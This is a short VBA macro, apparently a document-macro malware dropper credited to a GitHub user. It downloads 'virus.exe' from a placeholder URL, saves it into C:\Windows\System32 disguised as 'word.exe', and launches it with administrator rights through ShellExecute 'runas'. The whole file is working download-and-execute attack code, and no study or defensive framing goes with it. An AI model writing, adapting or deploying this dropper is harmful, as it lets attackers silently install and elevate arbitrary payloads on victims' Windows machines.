Sub hehe()
   Dim url As String
   Dim filePath As String

   ' Made By Payson - github.com/paysonism '
    
   url = "https://example.com/virus.exe"
   
   filePath = "C:\Windows\System32\word.exe"
   
   Dim http As Object
   Set http = CreateObject("MSXML2.XMLHTTP")
   http.Open "GET", url, False
   http.send
   
   Dim stream As Object
   Set stream = CreateObject("ADODB.Stream")
   stream.Open
   stream.Type = 1
   stream.Write http.responseBody
   stream.SaveToFile filePath, 2
   stream.Close
   
   Dim shell As Object
   Set shell = CreateObject("Shell.Application")
   shell.ShellExecute filePath, "", "", "runas", 1
   
   Set http = Nothing
   Set stream = Nothing
   Set shell = Nothing 
End Sub
